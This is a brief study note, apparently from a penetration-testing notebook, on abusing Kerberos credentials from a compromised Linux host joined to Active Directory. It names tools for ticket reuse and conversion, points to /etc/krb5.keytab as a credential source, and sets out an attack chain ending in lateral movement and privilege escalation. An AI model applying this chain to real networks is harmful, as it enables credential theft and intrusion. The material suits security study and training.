- 💻 Impacket and Evil-WinRM can use Kerberos tickets.
    
- 🔄 `impacket-ticketConverter` can convert between Linux `ccache` and Windows `.kirbi`.
    
- 🐧 Linikatz provides a Mimikatz-like approach to Linux AD credential hunting.
    
- 🔐 A Linux **machine account** can also possess Kerberos credentials, commonly through `/etc/krb5.keytab`.
    

> [!success]  
> **Remember the core chain:**
> 
> `Linux foothold → AD integration → keytab/ccache hunting → identify principal → obtain/reuse Kerberos credentials → validate ticket → authenticate to AD services → enumerate privileges → lateral movement / privilege escalation`